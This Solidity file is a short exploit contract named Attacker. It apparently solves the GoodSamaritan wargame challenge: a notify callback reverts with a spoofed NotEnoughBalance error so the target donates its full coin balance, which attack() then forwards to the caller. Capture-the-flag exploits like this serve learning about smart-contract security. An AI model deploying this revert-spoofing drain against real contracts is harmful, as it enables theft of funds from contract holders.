// SPDX-License-Identifier: MIT

pragma solidity >=0.8.2 <0.9.0;

interface GoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}

interface Coin {
    function transfer(address dest_, uint256 amount_) external;
    function balances(address target) external returns(uint);
}

contract Attacker {
    bool public isContract = true;
    GoodSamaritan to = GoodSamaritan(0x2e9De45855E64663AC83c8c839A0fc3faE03120F);
    Coin coin = Coin(0xbba2aBdb0974456B9A7a8E945fDa9687EbF1109c);

    error NotEnoughBalance();

    event Log(address you, uint got);

    function attack() external {
        to.requestDonation();
        coin.transfer(msg.sender, coin.balances(address(this)));
        emit Log(msg.sender, coin.balances(msg.sender));
    }

    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}